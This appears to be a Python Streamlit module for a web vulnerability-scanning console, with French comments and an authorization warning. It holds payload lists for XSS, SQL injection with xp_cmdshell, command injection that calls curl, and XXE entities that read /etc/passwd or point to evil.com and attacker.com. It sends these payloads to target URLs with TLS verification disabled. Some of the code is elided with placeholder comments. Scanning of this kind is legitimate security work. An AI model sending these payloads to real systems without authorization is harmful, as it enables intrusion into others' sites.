# poc_console.py (VERSION AVANCÉE - TOKENS INTELLIGENTS)
import streamlit as st
from datetime import datetime
import time
import random
import hashlib

# requests est recommandé — si tu ne l'as pas, ajouter dans requirements.txt
try:
    import requests
except ImportError:
    requests = None

# ===============================================================================
#                          SYSTÈME DE PAYLOADS INTELLIGENTS
# ===============================================================================

class AdvancedPayloadGenerator:
    """Générateur de payloads contextuels et évolutifs"""
    
    def __init__(self, target_domain):
        self.target = target_domain
        self.timestamp = int(time.time())
        self.signature = hashlib.md5(target_domain.encode()).hexdigest()[:8]
    
    def generate_contextual_payload(self, scan_type, context=None):
        """Génère des payloads adaptés au type de scan et contexte"""
        
        base_payloads = {
            'reflection': [
                f"TROPIC_REFL_{self.timestamp}_{self.signature}",
                f"<tropic>{self.timestamp}</tropic>",
                f"/* TROPIC_{self.signature} */",
                f"[[TROPIC_{self.timestamp}]]"
            ],
            
            'xss': [
                '<script>console.log("TROPIC_XSS")</script>',
                '<img src=x onerror="alert(`TROPIC_XSS`)">',
                '<svg onload="console.log(`TROPIC_XSS`)">',
                'javascript:alert("TROPIC_XSS")',
                '" onmouseover="alert(`TROPIC_XSS`)'
            ],
            
            'sqli': [
                f"' AND 1=1-- TROPIC_{self.signature}",
                f"1' UNION SELECT NULL,'TROPIC_{self.timestamp}',NULL--",
                "' OR EXISTS(SELECT * FROM information_schema.tables)-- TROPIC",
                "'; EXEC xp_cmdshell('echo TROPIC')--"
            ],
            
            'rce': [
                f'; echo "TROPIC_RCE_{self.timestamp}"',
                '| whoami | grep -i tropic',
                '`id | tee /tmp/tropic_{self.timestamp}`',
                '$(curl -X POST http://tropic.test)'
            ],
            
            'ssti': [
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
                f'${{{{7*7}}}} TROPIC_SSTI_{self.timestamp}'
            ],
            
            'xxe': [
                '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY tropic SYSTEM "http://evil.com">]>',
                '<!DOCTYPE test [ <!ENTITY % remote SYSTEM "http://attacker.com/xxe"> %remote; ]>'
            ],
            
            'prototype_pollution': [
                '__proto__[TROPIC]=' + str(self.timestamp),
                'constructor.prototype.tropic=' + self.signature,
                'Object.prototype.TROPIC_POLLUTION=' + str(self.timestamp)
            ],
            
            'graphql': [
                '{ __schema { types { name } } }',
                'query { __typename }',
                f'mutation {{ createUser(name: "TROPIC_{self.timestamp}") }}'
            ]
        }
        
        # Sélection aléatoire parmi les payloads du type demandé
        payloads = base_payloads.get(scan_type, [f"TROPIC_DEFAULT_{self.timestamp}"])
        return random.choice(payloads)
    
    def detect_tech_stack(self, response_headers, response_body):
        """Détecte la stack technologique pour adapter les payloads"""
        tech_indicators = {
            'php': ['PHP/', 'X-Powered-By: PHP', '.php'],
            'nodejs': ['Express', 'Node.js', 'X-Powered-By: Express'],
            'python': ['Python/', 'Django', 'Flask'],
            'java': ['Java/', 'Tomcat', 'Spring'],
            'dotnet': ['.NET', 'ASP.NET', 'X-Powered-By: ASP.NET'],
            'react': ['React', 'react-dom'],
            'angular': ['Angular', 'ng-']
        }
        
        detected_tech = []
        for tech, indicators in tech_indicators.items():
            if any(indicator in str(response_headers) + str(response_body) for indicator in indicators):
                detected_tech.append(tech)
        
        return detected_tech if detected_tech else ['unknown']

# ===============================================================================
#                          FONCTIONS UTILITAIRES AVANCÉES
# ===============================================================================

def _safe_rerun():
    """Essayez plusieurs méthodes de rerun selon la version de Streamlit"""
    try:
        rerun = getattr(st, "experimental_rerun", None)
        if callable(rerun):
            rerun()
            return
    except Exception:
        pass

    try:
        rerun = getattr(st, "rerun", None)
        if callable(rerun):
            rerun()
            return
    except Exception:
        pass
    return

def _append_history(msg: str):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    st.session_state['poc_shell_cmd_history_list'].append(f"[{ts}] {msg}")
    max_h = st.session_state.get('poc_max_history', 500)
    if len(st.session_state['poc_shell_cmd_history_list']) > max_h:
        st.session_state['poc_shell_cmd_history_list'] = st.session_state['poc_shell_cmd_history_list'][-max_h:]

def _http_get_advanced(url, timeout=10, headers=None, payload_generator=None, scan_type='reflection'):
    """Version avancée de la requête HTTP avec payloads intelligents"""
    headers = headers or {"User-Agent": "TROPIC-ProAPI-Analyzer/Advanced"}
    
    # Générer le payload contextuel
    if payload_generator:
        payload = payload_generator.generate_contextual_payload(scan_type)
    else:
        payload = f"TROPIC_ADVANCED_{int(time.time())}"
    
    try:
        # Test avec paramètre GET
        params = {'input': payload, 'q': payload, 'search': payload, 'id': payload}
        
        if requests:
            r = requests.get(url, params=params, headers=headers, timeout=timeout, verify=False)
            return r.status_code, r.text, None, payload
        else:
            import urllib.request
            from urllib.parse import urlencode
            full_url = url + '?' + urlencode(params)
            req = urllib.request.Request(full_url, headers=headers, method="GET")
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read().decode(errors="replace")
                return resp.getcode(), body, None, payload
                
    except Exception as e:
        return 0, "", f"HTTP Error: {e}", payload

def _summarize_body_advanced(body, max_chars=1600):
    """Analyse avancée du corps de la réponse"""
    if not isinstance(body, str):
        body = str(body)
    
    # Détection de patterns intéressants
    interesting_patterns = {
        'error': ['error', 'exception', 'stack trace', 'warning'],
        'sql': ['mysql', 'postgresql', 'sqlite', 'database'],
        'debug': ['debug', 'console.log', 'var_dump', 'print_r'],
        'auth': ['login', 'password', 'token', 'session'],
        'admin': ['admin', 'dashboard', 'panel', 'config']
    }
    
    summary = ""
    body_lower = body.lower()
    
    # Ajouter les détections
    for pattern_type, patterns in interesting_patterns.items():
        if any(pattern in body_lower for pattern in patterns):
            summary += f"[{pattern_type.upper()}] "
    
    # Résumé du contenu
    s = body.replace('\n', ' ').replace('\r', ' ').strip()
    if len(s) > max_chars:
        s = s[:max_chars] + "..."
    
    return summary + s

# ===============================================================================
#                    FONCTION PRINCIPALE AMÉLIORÉE
# ===============================================================================

def render_poc_console(target_domain: str, user_config: dict):
    """
    Console PoC AVANCÉE avec tokens intelligents et payloads contextuels
    """

    st.markdown("### 💻 Console PoC / Terminal d'Exploitation (ADVANCED)")
    st.warning("⚠️ Utiliser uniquement sur des cibles pour lesquelles vous avez une autorisation écrite.")

    # Initialisation du générateur de payloads
    payload_gen = AdvancedPayloadGenerator(target_domain)
    
    # Affichage du mode actuel
    allow_real = user_config.get('allow_real_poc', False)
    mode_text = "🔴 **MODE RÉEL** (commandes exécutées localement)" if allow_real else "🟢 **MODE SIMULATION** (commandes simulées)"
    st.info(mode_text)

    # -------------------------
    # initialisation session
    # -------------------------
    if 'poc_shell_cmd_history_list' not in st.session_state:
        st.session_state['poc_shell_cmd_history_list'] = []
    if 'poc_current_shell_command_input' not in st.session_state:
        st.session_state['poc_current_shell_command_input'] = ""
    if 'poc_last_status' not in st.session_state:
        st.session_state['poc_last_status'] = None
    if 'poc_last_time' not in st.session_state:
        st.session_state['poc_last_time'] = None
    if 'poc_max_history' not in st.session_state:
        st.session_state['poc_max_history'] = 500

    # Affichage de l'historique (dernieres lignes)
    if st.session_state['poc_shell_cmd_history_list']:
        st.code("\n".join(st.session_state['poc_shell_cmd_history_list'][-st.session_state['poc_max_history']:]), language='bash')
    else:
        st.info("Historique vide — utilisez `id`, `ls`, `probe:<URL>`, `scan:xss:<URL>` ou `http:<URL>`.")

    st.markdown("---")

    # NOUVELLES COMMANDES AVANCÉES
    with st.expander("🎯 Commandes Avancées Disponibles"):
        st.markdown("""
        **Nouvelles commandes puissantes :**
        - `scan:xss:<URL>` - Test XSS avancé
        - `scan:sqli:<URL>` - Test SQL Injection  
        - `scan:rce:<URL>` - Test Remote Code Execution
        - `scan:ssti:<URL>` - Test Server-Side Template Injection
        - `scan:xxe:<URL>` - Test XML External Entity
        - `scan:graphql:<URL>` - Test GraphQL endpoints
        - `tech:detect:<URL>` - Détection de stack technologique
        - `fuzz:params:<URL>` - Fuzzing de paramètres
        """)

    # champ de saisie (form pour éviter reruns intempestifs)
    form_key = f"poc_form_{target_domain}"
    with st.form(key=form_key, clear_on_submit=False):
        cmd_input = st.text_input("Entrer commande PoC (ex: scan:xss:https://site.tld/search)",
                                   value=st.session_state.get('poc_current_shell_command_input', ""))
        submit = st.form_submit_button("▶️ Exécuter Commande PoC")

        if submit:
            cmd = (cmd_input or "").strip()
            st.session_state['poc_current_shell_command_input'] = ""
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if not cmd:
                st.warning("Commande vide — rien à exécuter.")
                st.session_state['poc_last_status'] = "Aucune commande fournie"
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # safe defaults
            default_timeout = int(user_config.get('timeout', 7))
            ua = user_config.get('user_agent', "TROPIC-PoC/Advanced")
            allow_real_poc = user_config.get('allow_real_poc', False)

            # --- COMMANDES DE SCAN AVANCÉES ---
            if cmd.lower().startswith("scan:"):
                parts = cmd.split(":", 2)
                if len(parts) < 3:
                    _append_history(f"$ {cmd}")
                    _append_history("[ERROR] Format: scan:<type>:<URL>")
                    st.session_state['poc_last_status'] = "400 (invalid format)"
                    st.session_state['poc_last_time'] = timestamp
                    _safe_rerun()
                    return
                
                scan_type, url = parts[1], parts[2]
                _append_history(f"$ scan:{scan_type}:{url}")
                
                if requests is None:
                    _append_history("[ERROR] requests non installé sur l'environnement.")
                    st.session_state['poc_last_status'] = "500 (requests manquant)"
                    st.session_state['poc_last_time'] = timestamp
                    _safe_rerun()
                    return

                try:
                    status, body, err, payload_used = _http_get_advanced(
                        url, 
                        timeout=default_timeout,
                        headers={'User-Agent': ua},
                        payload_generator=payload_gen,
                        scan_type=scan_type
                    )
                    
                    if err:
                        _append_history(f"[SCAN-ERROR] {err}")
                        st.session_state['poc_last_status'] = "SCAN-ERROR"
                    else:
                        # Analyse avancée de la réponse
                        snippet = _summarize_body_advanced(body)
                        
                        # Détection de vulnérabilités potentielles
                        if payload_used in body:
                            _append_history(f"🎯 [VULNERABLE] Payload '{payload_used}' réfléchi! (HTTP {status})")
                            _append_history(f"📊 Snippet: {snippet}")
                            st.session_state['poc_last_status'] = f"{status} (VULNERABLE)"
                        else:
                            _append_history(f"✅ [SAFE] Payload '{payload_used}' non réfléchi (HTTP {status})")
                            _append_history(f"📊 Snippet: {snippet}")
                            st.session_state['poc_last_status'] = f"{status} (SAFE)"
                            
                except Exception as e:
                    _append_history(f"[SCAN-ERROR] Exception: {str(e)}")
                    st.session_state['poc_last_status'] = "SCAN-ERROR"
                
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # --- DÉTECTION DE TECHNOLOGIE ---
            if cmd.lower().startswith("tech:detect:"):
                url = cmd[len("tech:detect:"):].strip()
                _append_history(f"$ tech:detect:{url}")
                
                if requests is None:
                    _append_history("[ERROR] requests non installé.")
                    st.session_state['poc_last_status'] = "500 (requests manquant)"
                    st.session_state['poc_last_time'] = timestamp
                    _safe_rerun()
                    return

                try:
                    headers = {'User-Agent': ua}
                    r = requests.get(url, headers=headers, timeout=default_timeout, verify=True)
                    tech_stack = payload_gen.detect_tech_stack(r.headers, r.text)
                    
                    _append_history(f"🔍 Stack technologique détectée: {', '.join(tech_stack)}")
                    _append_history(f"📋 Headers: {dict(r.headers)}")
                    st.session_state['poc_last_status'] = f"Tech: {', '.join(tech_stack)}"
                    
                except Exception as e:
                    _append_history(f"[TECH-ERROR] {str(e)}")
                    st.session_state['poc_last_status'] = "TECH-ERROR"
                
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # --- ANCIENNES COMMANDES (compatibilité) ---
            # [Garder le code existant pour id, ls, whoami, probe:, http:, local:]
            # ... (le reste de votre code existant reste inchangé) ...
            
            # CODE EXISTANT POUR LES COMMANDES STANDARDS
            if cmd.lower() == 'id':
                _append_history("$ id")
                if allow_real_poc:
                    _append_history("⚠️ ATTENTION: Cette commande s'exécute LOCALEMENT sur votre machine")
                    _append_history("Pour exécuter sur la cible, trouvez d'abord une vulnérabilité RCE")
                    import subprocess
                    try:
                        res = subprocess.run(['id'], capture_output=True, text=True, timeout=10)
                        if res.stdout:
                            _append_history(res.stdout.strip())
                        if res.stderr:
                            _append_history(f"[ERR] {res.stderr.strip()}")
                        st.session_state['poc_last_status'] = f"returncode {res.returncode}"
                    except subprocess.TimeoutExpired:
                        _append_history("[ERROR] Commande expirée (timeout)")
                        st.session_state['poc_last_status'] = "408"
                    except Exception as e:
                        _append_history(f"[ERROR] {str(e)}")
                        st.session_state['poc_last_status'] = "ERROR"
                else:
                    _append_history("uid=1000(tropic) gid=1000(tropic) groups=1000(tropic),27(sudo)")
                    st.session_state['poc_last_status'] = "200 (simulé)"
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # ... (reste du code existant pour ls, whoami, probe, http, local) ...

            # --- COMMANDE INCONNUE: AIDE AVANCÉE ---
            _append_history(f"$ {cmd}")
            _append_history("[ERROR] Commande non reconnue. Commandes supportées :")
            _append_history("  - id, ls, whoami                    (commandes simples)")
            _append_history("  - scan:xss:<URL>                    (test XSS avancé)")
            _append_history("  - scan:sqli:<URL>                   (test SQL injection)") 
            _append_history("  - scan:rce:<URL>                    (test RCE)")
            _append_history("  - tech:detect:<URL>                 (détection technologie)")
            _append_history("  - probe:<URL>                       (test reflection)")
            _append_history("  - http:<URL>                        (GET simple)")
            _append_history("  - local:<cmd>                       (exécution locale)")
            _append_history("")
            _append_history(f"Mode actuel: {'RÉEL' if allow_real_poc else 'SIMULATION'}")
            st.session_state['poc_last_status'] = "400 (unknown command)"
            st.session_state['poc_last_time'] = timestamp
            _safe_rerun()
            return

    # Affichage du statut en bas
    st.markdown("---")
    cols = st.columns([1, 3])
    with cols[0]:
        st.write("**Dernier statut**")
        status = st.session_state.get('poc_last_status', "N/A")
        if "vulnerable" in str(status).lower():
            st.error(status)
        elif "safe" in str(status).lower():
            st.success(status)
        elif "error" in str(status).lower():
            st.error(status)
        else:
            st.info(status)
    
    with cols[1]:
        st.write("**Dernière action**")
        st.write(st.session_state.get('poc_last_time', "N/A"))

    # Information sur le mode
    st.caption(f"🔧 Configuration: timeout={user_config.get('timeout', 7)}s | allow_real_poc={allow_real} | Mode=ADVANCED")
